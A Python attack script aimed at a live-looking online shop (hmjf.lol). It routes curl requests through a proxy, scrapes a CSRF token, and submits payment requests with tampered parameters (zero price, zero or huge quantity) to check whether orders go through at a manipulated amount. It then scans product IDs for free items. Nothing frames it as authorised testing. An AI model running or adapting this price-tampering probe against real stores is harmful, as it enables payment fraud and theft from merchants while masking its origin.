#!/usr/bin/env python3
import subprocess, re, os, json

PX = [l.split("=", 1)[1].strip().strip('"') for l in open("/data/config/proxy.env") if l.startswith("PROXY_URL=")][0]
UA = "Mozilla/5.0"
REF = "https://hmjf.lol/shop/"
B = "https://hmjf.lol/shop"
CK = "/tmp/tpay3.ck"
HS = "256"

def c(url, post=None, use_ck=True):
    cmd = ["curl", "-s", "--max-time", "15", "-x", PX, "-A", UA, "-H", f"Referer: {REF}"]
    if use_ck:
        cmd += ["-b", CK, "-c", CK]
    if post is not None:
        cmd += ["-X", "POST", "-d", post, "-H", "Content-Type: application/x-www-form-urlencoded"]
    cmd.append(url)
    return subprocess.run(cmd, capture_output=True, text=True).stdout

if os.path.exists(CK):
    os.remove(CK)

gt = json.loads(c(f"{B}/ajax.php?act=gettoolnew", post="", use_ck=False))
print("gettoolnew", len(gt.get("data", [])))

page = c(f"{B}/?mod=buy&tid=72")
csrf = re.search(r'csrf_token\s*=\s*"([^"]+)"', page).group(1)

for label, extra in [("normal", ""), ("price0", "&money=0"), ("num0", "&num=0"), ("num999", "&num=999")]:
    post = f"tid=72&inputvalue=probe123&num=1&hashsalt={HS}&csrf_token={csrf}{extra}"
    r = c(f"{B}/ajax.php?act=pay", post=post)
    print(label, r[:220])
    tn = re.search(r"20\d{15}", r)
    if tn:
        sh = c(f"{B}/other/submit.php?type=alipay&orderid={tn.group(0)}", use_ck=False)
        mo = re.search(r"money=([0-9.]+)", sh)
        print("  money", mo.group(1) if mo else "?")

# scan all tids 1-50 for price 0 on buy page snippet
for tid in [1, 2, 3, 10, 20, 50, 72, 194]:
    p = c(f"{B}/?mod=buy&tid={tid}")
    price = re.search(r'price\s*[=:]\s*["\']?([0-9.]+)', p) or re.search(r'商品售价.*?([0-9.]+)', p)
    free = "免费领取" in p or (price and float(price.group(1)) == 0)
    print(f"tid={tid} free={free} price={price.group(1) if price else '?'}")
